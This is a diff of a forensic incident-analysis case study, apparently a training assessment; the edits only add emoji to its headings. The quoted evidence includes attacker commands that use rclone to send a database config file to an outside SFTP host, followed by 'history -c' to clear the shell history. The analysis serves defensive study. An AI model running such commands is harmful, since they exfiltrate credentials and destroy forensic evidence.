@@ -1,9 +1,9 @@
-# Case Study 10: Real-attack-Incident Analysis 🛡️
+# ☢️ Case Study 10: Real-attack-Incident Analysis
 
-## 1. Executive Summary
+## ✅ 1. Executive Summary
 This case study represents a final skills assessment involving a multi-stage system compromise. I identified a successful SSH brute-force attack followed by the unauthorized installation of data exfiltration tools and the subsequent theft of sensitive database configurations. The attacker attempted to destroy evidence by clearing command histories.
 
-## 2. Multi-Source Evidence (The "Smoking Gun")
+## 📌 2. Multi-Source Evidence (The "Smoking Gun")
 
 ### A. Authentication Logs (`/var/log/auth.log`)
 Feb 17 02:00:15 srv-prod sshd[1102]: Accepted password for dev_admin from 185.220.101.5
@@ -19,7 +19,7 @@ rclone config create remote_storage sftp host=95.122.33.44 user=attacker
 rclone copy /var/www/html/api/backup/config_db.php remote_storage: /backups/
 history -c
 
-## 3. Technical Analysis (The Kill Chain)
+## 🛠️ 3. Technical Analysis (The Kill Chain)
 Phase 1: Initial Access (Brute Force)
 Finding: After several failed attempts, the attacker successfully authenticated as dev_admin via SSH.
 Conclusion: Weak password policy allowed for a successful credential-guessing attack.
@@ -36,7 +36,7 @@ Phase 4: Anti-Forensics
 Finding: The attacker executed history -c.
 Conclusion: A deliberate attempt to hinder an investigation by clearing the bash command history, indicating high-level malicious intent.
 
-## 4. Chain of Custody (Legal Perspective)
+## 📖 4. Chain of Custody (Legal Perspective)
 Storage chain (legal perspective)
 In this attack, I identified the history -c command as important evidence. 
 Attempting to destroy records is a clear criminal act that goes beyond the initial unauthorized access. 
